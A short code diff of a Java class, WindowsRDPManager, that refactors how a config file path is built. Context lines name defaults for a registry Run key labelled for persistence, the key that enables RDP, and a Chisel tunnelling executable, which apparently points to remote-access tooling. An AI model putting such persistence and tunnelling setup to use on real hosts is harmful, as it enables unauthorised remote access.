@@ -5,6 +5,7 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.Base64;
 import java.util.HashMap;
@@ -53,7 +54,8 @@ public class WindowsRDPManager {
 		String defaultPersistRegKey = "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 		String defaultEnableRegKey = "\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"";
 		String defaultLocalChiselExec = "C:\\Chisel\\clisel_win_64.exe";
-		try (InputStream input = new FileInputStream("config\\rdp.properties")) {
+		Path defaultConfig = Paths.get("config", "rdp.properties");
+		try (InputStream input = new FileInputStream(defaultConfig.toFile())) {
 
 			Properties prop = new Properties();
 
